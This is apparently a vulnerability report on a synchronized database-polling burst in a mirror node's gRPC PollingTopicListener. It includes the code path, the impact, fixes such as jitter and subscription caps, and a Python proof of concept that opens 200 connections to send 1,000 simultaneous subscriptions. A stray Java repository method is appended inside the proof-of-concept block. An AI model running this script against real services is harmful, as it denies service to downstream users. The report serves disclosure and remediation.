### Title
Synchronized DB Polling Burst via Unauthenticated Mass Subscription to `PollingTopicListener`

### Summary
When `PollingTopicListener` is active (listener type `POLL`), each call to `listen()` creates an independent cold publisher with a fixed `delaySubscription(interval, scheduler)` before the first DB poll. Because this initial delay is identical for all subscribers and carries no jitter, an unprivileged attacker who opens many gRPC connections simultaneously causes all first-poll DB queries to fire at the same instant after the delay expires. No per-IP connection limit, no subscription rate limit, and no jitter on the initial delay exist to prevent this.

### Finding Description

**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java`, `listen()`, lines 34–49:

```java
return Flux.defer(() -> poll(context))
        .delaySubscription(interval, scheduler)          // fixed delay, no jitter
        .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                .jitter(0.1)                             // jitter only on repeat cycle
                .withFixedDelay(interval)
                .withScheduler(scheduler))
```

**Root cause:** `delaySubscription(interval, scheduler)` applies a single, fixed `Duration` (default 500 ms, minimum 50 ms per `@DurationMin`) to every subscriber independently. The `jitter(0.1)` is scoped exclusively to the `repeatWhen` repeat cycle and has no effect on the initial subscription delay. Every subscriber that connects within the same short window therefore fires its first `poll()` → `topicMessageRepository.findByFilter()` call at the same wall-clock instant.

**Exploit flow:**

1. Attacker opens N gRPC connections to port 5600 (no authentication required).
2. Each connection issues up to `maxConcurrentCallsPerConnection = 5` `subscribeTopic` RPCs (default), so N connections yield up to 5N active subscriptions.
3. Each subscription reaches `PollingTopicListener.listen()`, which schedules a first poll after exactly `interval` ms on the shared `boundedElastic` scheduler.
4. At t = `interval`, all 5N subscriptions simultaneously call `topicMessageRepository.findByFilter()`, each executing a JPA/SQL query against the PostgreSQL mirror-node database.
5. The DB connection pool (typically 10–20 connections) is exhausted; queries queue; latency spikes for all users.

**Why existing checks are insufficient:**

- `maxConcurrentCallsPerConnection = 5` (NettyProperties, line 14) limits calls per TCP connection but imposes no cap on the number of connections or total active subscriptions.
- No IP-based rate limiting or subscription count limit exists in the gRPC layer or `TopicMessageServiceImpl`.
- `Schedulers.boundedElastic()` queues tasks but does not drop them; all N queries still execute.
- `jitter(0.1)` only randomises the inter-poll delay after the first poll, so it does not prevent the initial burst.

### Impact Explanation

Every active subscription in `POLL` mode issues an independent SQL query to the mirror-node PostgreSQL database on each polling cycle. A synchronized burst of thousands of simultaneous queries exhausts the DB connection pool, causes query queuing, and degrades or denies service to all mirror-node gRPC consumers. Because the mirror node is the canonical read path for HCS topic data relied upon by dApps and wallets, sustained unavailability affects downstream applications.

### Likelihood Explanation

The gRPC port is publicly reachable with no authentication. Opening thousands of TCP connections and issuing `subscribeTopic` RPCs requires only a standard gRPC client library and no privileged credentials. The attack is repeatable: after connections are dropped, the attacker can reconnect and repeat. The fixed 500 ms initial delay is short enough that timing precision is trivially achievable.

### Recommendation

1. **Add jitter to the initial delay:** Replace `delaySubscription(interval, scheduler)` with a randomised delay, e.g. `delaySubscription(interval.plus(Duration.ofMillis(ThreadLocalRandom.current().nextLong(interval.toMillis()))), scheduler)`, so subscribers starting simultaneously are spread across a full interval window.
2. **Enforce a global subscription cap:** Track active subscription count (the `subscriberCount` gauge already exists in `TopicMessageServiceImpl`) and reject new subscriptions above a configurable threshold.
3. **Add per-IP connection rate limiting** at the Netty/load-balancer layer to prevent a single source from opening unbounded connections.
4. **Prefer `SHARED_POLL` or `REDIS` mode** in production; `SHARED_POLL` uses a single shared poller regardless of subscriber count, eliminating the per-subscriber DB query problem entirely.

### Proof of Concept

```python
import grpc, threading, time
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2

TARGET = "mirror-node-grpc:5600"
N_CONNECTIONS = 200   # 200 connections × 5 calls = 1000 simultaneous subscriptions

def subscribe(stub):
    req = consensus_service_pb2.ConsensusTopicQuery(
        topicID=...,  # any valid topic
        consensusStartTime=...
    )
    try:
        for _ in stub.subscribeTopic(req): pass
    except: pass

channels = [grpc.insecure_channel(TARGET) for _ in range(N_CONNECTIONS)]
stubs    = [consensus_service_pb2_grpc.ConsensusServiceStub(c) for c in channels]

# Launch all subscriptions simultaneously
threads = []
for stub in stubs:
    for _ in range(5):   # maxConcurrentCallsPerConnection
        t = threading.Thread(target=subscribe, args=(stub,))
        threads.append(t)

# Start all at once — all will fire their first DB poll after exactly `interval` ms
for t in threads: t.start()
# After ~500 ms, 1000 simultaneous SQL queries hit the DB

    public Stream<TopicMessage> findByFilter(TopicMessageFilter filter) {
        CriteriaBuilder cb = entityManager.getCriteriaBuilder();
        CriteriaQuery<TopicMessage> query = cb.createQuery(TopicMessage.class);
        Root<TopicMessage> root = query.from(TopicMessage.class);

        Predicate predicate = cb.and(
                cb.equal(root.get(TOPIC_ID), filter.getTopicId()),
                cb.greaterThanOrEqualTo(root.get(CONSENSUS_TIMESTAMP), filter.getStartTime()));

        if (filter.getEndTime() != null) {
            predicate = cb.and(predicate, cb.lessThan(root.get(CONSENSUS_TIMESTAMP), filter.getEndTime()));
        }

        query = query.select(root).where(predicate).orderBy(cb.asc(root.get(CONSENSUS_TIMESTAMP)));

        TypedQuery<TopicMessage> typedQuery = entityManager.createQuery(query);
        typedQuery.setHint(HibernateHints.HINT_READ_ONLY, true);

        if (filter.hasLimit()) {
            typedQuery.setMaxResults((int) filter.getLimit());
        }

        if (filter.getLimit() != 1) {
            // only apply the hint when limit is not 1
            entityManager.createNativeQuery(TOPIC_MESSAGES_BY_ID_QUERY_HINT).executeUpdate();
        }

        return typedQuery.getResultList().stream(); // getResultStream()'s cursor doesn't work with reactive streams
    }
